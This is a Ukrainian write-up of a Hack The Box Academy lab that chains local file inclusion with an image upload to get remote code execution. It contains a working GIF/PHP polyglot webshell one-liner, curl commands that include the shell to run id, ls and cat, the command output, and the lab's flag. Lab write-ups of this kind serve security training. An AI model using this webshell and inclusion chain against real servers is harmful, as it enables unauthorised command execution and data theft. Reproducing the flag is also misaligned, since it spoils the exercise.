## LFI + File Upload → RCE

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [LFI and File Uploads](https://academy.hackthebox.com/app/module/23/section/1493)
**Ціль:** `154.57.164.77:32236`
**Прапор:** `HTB{upl04d+lf!+3x3cut3=rc3}`

***

## Ідея атаки

- Є **LFI** через `?language=`.
- Є **file upload** на `/settings.php`, який зберігає файли у `./profile_images/`.
- Завантажуємо **polyglot GIF+PHP вебшелл**, а потім включаємо його через LFI → RCE.

***

## Крок 1 — Підготовка polyglot GIF webshell

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

- `GIF8` — валідний GIF header (щоб пройти MIME/preview).
- Далі йде PHP-код, який виконує `cmd` з GET-параметра.

***

## Крок 2 — Завантаження файлу

1. Відкриваємо:
   ```
   http://154.57.164.77:32236/settings.php
   ```
2. Обираємо `shell.gif` у полі `uploadFile`.
3. Тиснемо **Upload**.
4. Після завантаження сторінка показує:
   ```html
   <img src="data:image/gif;base64,R0lGODw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pgo=" class="profile-image" id="profile-image">
   ```
   Це приклад preview-картинки, але важливе для нас — знаємо, що файл фізично лягає у `./profile_images/`.

***

## Крок 3 — Використання LFI для включення shell

Перевіряємо, що shell виконується:

```bash
curl -s "http://154.57.164.77:32236/index.php?language=./profile_images/shell.gif&cmd=id" \
  | grep uid
```

**Результат:**
```
GIF8uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- `GIF8` на початку — наш header.
- Далі `id` виводить інформацію про користувача → RCE працює.

***

## Крок 4 — Пошук прапора в `/`

```bash
curl -s "http://154.57.164.77:32236/index.php?language=./profile_images/shell.gif&cmd=ls+/" \
  | grep -v "^$\|<\|html\|DOCTYPE"
```

**Результат (усічено):**
```
GIF82f40d853e2d4768d87da1c81772bae0a.txt
bin
boot
...
```

Цільовий файл: `2f40d853e2d4768d87da1c81772bae0a.txt`.

***

## Крок 5 — Читаємо прапор

```bash
curl -s "http://154.57.164.77:32236/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt" \
  | grep -o 'HTB{[^}]*}'
```

**Результат:**
```
HTB{upl04d+lf!+3x3cut3=rc3}
```

***

## Швидкий плейбук (TL;DR)

```bash
# 1) Створити polyglot GIF shell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# 2) Завантажити shell.gif через /settings.php

# 3) Перевірити RCE
curl -s "http://154.57.164.77:32236/index.php?language=./profile_images/shell.gif&cmd=id"

# 4) Пошук файлу з прапором
curl -s "http://154.57.164.77:32236/index.php?language=./profile_images/shell.gif&cmd=ls+/" \
  | grep -v "^$\|<\|html\|DOCTYPE"

# 5) Прочитати прапор
curl -s "http://154.57.164.77:32236/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt" \
  | grep -o 'HTB{[^}]*}'
```
